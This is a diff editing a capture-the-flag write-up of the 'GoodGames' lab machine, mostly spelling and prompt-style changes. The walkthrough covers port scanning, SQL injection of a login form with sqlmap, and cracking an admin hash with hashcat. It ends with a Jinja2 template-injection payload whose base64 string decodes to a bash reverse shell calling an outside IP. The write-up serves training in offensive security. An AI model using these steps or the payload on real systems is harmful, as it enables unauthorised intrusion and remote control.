@@ -23,7 +23,8 @@ difficulty: Easy
 As usual I started with a full TCP scan to identify the open ports and services running on the target machine.
 
 ```bash
-tr3m0x@blackhat$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.96.71 -oN nmap/tcp_scan.nmap 
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.96.71 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 20:15 CET
 Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 54.58% done; ETC: 20:17 (0:00:32 remaining)
@@ -39,42 +40,45 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 80.24 seconds
 ```
 ### Web Enumeration
-A single tcp port is open . Next step I visited the web application<br>
+A single TCP port is open. Next, I visited the web application.<br>
 
 ![Home Page](./assets/homepage.png)
 
-After creating and acount and singing in, I found at the bottom of the page i saw **GoodGames.HTB**<br>
+After creating an account and signing in, I found at the bottom of the page and saw **GoodGames.HTB**.<br>
 
 ![profile](./assets/profile.png)
 
-so I added **goodgames.htb** to my **/etc/hosts** file.
+So I added **goodgames.htb** to my **/etc/hosts** file.
 
 ```bash
-tr3m0x@blackhat$ echo "10.129.96.71 goodgames.htb" | sudo tee -a /etc/hosts
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ echo "10.129.96.71 goodgames.htb" | sudo tee -a /etc/hosts
 ```
 
 I tried to fuzz for vhosts but nothing appeared.<br>
-Then i noticed soemthing when i logged in my Nickname is rendered at the profile and since the app is running flask i tried some server side template injection payloads but got nothing.<br>
+Then I noticed something when I logged in: my nickname is rendered in the profile, and since the app is running Flask, I tried some server-side template injection payloads but got nothing.<br>
 
-I tried also some xss paylaods thinking that maybe there is a bot visiting new users profiles but nothinng happened and also the html is escaped.<br>
+I also tried some XSS payloads, thinking there might be a bot visiting new user profiles, but nothing happened, and the HTML was also escaped.<br>
 
 ![escaped](./assets/escaped.png)
 
 ## Shell as root on docker container
 
-### Sql Injection
+### SQL Injection
 
-Then i thought about testing the login for **SQL Injection** and i sent a simple quote in teh email and the password field .
+Then I thought about testing the login for **SQL Injection** and sent a simple quote in the email and password fields.
 
 ```text
 email=test1%40test.com'&password=test
 ```
-and I got **Internal server error!**<br>
 
-so I saved the login request in a **login.req** file and I used **sqlmap** to test for sql injection.
+I got **Internal server error!**<br>
+
+So I saved the login request in a **login.req** file and used **sqlmap** to test for SQL injection.
 
 ```bash
-tr3m0x@blackhat$ sqlmap -r login.req --level 5 --risk 3 --dbms=mysql --batch
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ sqlmap -r login.req --level 5 --risk 3 --dbms=mysql --batch
 ```
 
 and the sqlinjection was confirmed. 
@@ -103,7 +107,8 @@ and then I dumped the user table.
 
 let's crack the admin hash 
 ```bash
-tr3m0x@blackhat$ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt 
+┌─[tr3m0x@parrot]─[~]
+└──╼ $ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -180,7 +185,7 @@ It's basically the only page where we can input data so since it's flask as I sa
 
 ![ssti](./assets/ssti.png)<br>
 
-I used the followin payload to get a reverse shell on the target machine.
+I used the following payload to get a reverse shell on the target machine.
 
 ```text
 {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjQ3LzQ0NDQgMD4mMQ== | base64 -d | bash')['read']()}}
